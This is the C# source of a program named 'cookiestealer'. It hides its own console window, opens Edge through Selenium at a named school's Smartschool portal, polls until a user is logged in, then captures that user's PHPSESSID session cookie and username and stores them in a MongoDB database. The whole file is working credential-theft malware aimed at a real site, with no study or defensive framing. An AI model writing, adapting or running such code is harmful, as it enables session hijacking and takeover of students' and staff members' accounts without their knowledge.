using System;
using System.Threading;
using System.IO;
using OpenQA.Selenium.Edge;
using OpenQA.Selenium;
using OpenQA.Selenium.Support;
using NUnit.Framework;
using MongoDB.Driver;
using MongoDB.Bson;
using MongoConn;
using System.Runtime.InteropServices;


namespace cookiestealer
{
    class Program
    {
        public static IWebDriver? driver;
        // Import windows API to hide console
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

        static void Main()
        {
            // Hide window
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, 0);

            // Variables
            driver = new EdgeDriver();
            string cookieName;
            string cookieVal;
            string cookieDomain;
            string userName = "Not Found";
            MongoCRUD db = new MongoCRUD("cookiestealer");

            // Start driver
            driver.Navigate().GoToUrl("https://campussintursula.smartschool.be");

            while (true)
            {
                // Getting the cookie
                Thread.Sleep(300000); // 300 sec
                driver.Navigate().GoToUrl("https://campussintursula.smartschool.be");

                // Getting username
                try
                {
                    userName = driver.FindElement(By.XPath("//*[@id=\"smscTopContainer\"]/nav/div[1]/button/div[1]/span[1]")).Text;
                    Console.WriteLine($"Found account: {userName}");
                    break;
                }
                catch (System.Exception)
                {
                    Console.WriteLine("Error fetching username, trying again...");
                }
            }

            cookieName = driver.Manage().Cookies.GetCookieNamed("PHPSESSID").Name;
            cookieVal = driver.Manage().Cookies.GetCookieNamed("PHPSESSID").Value;
            cookieDomain = driver.Manage().Cookies.GetCookieNamed("PHPSESSID").Domain;
            DateTime now = DateTime.Now;


            // Insert record into MongoDB
            db.InsertRecord("PHPSESSID", new CookieModel
            {
                userName = userName,
                cookieName = cookieName,
                cookieValue = cookieVal,
                cookieDomain = cookieDomain,
                cookieDate = now.ToString("F"),
                browser = "Edge"
            });
            Console.WriteLine("Done");
        }
    }

    public class CookieModel
    {
        public string? userName { get; set; }
        public string? cookieName { get; set; }
        public string? cookieValue { get; set; }
        public string? cookieDomain { get; set; }
        public string? cookieDate { get; set; }
        public string? browser { get; set; }
    }
}
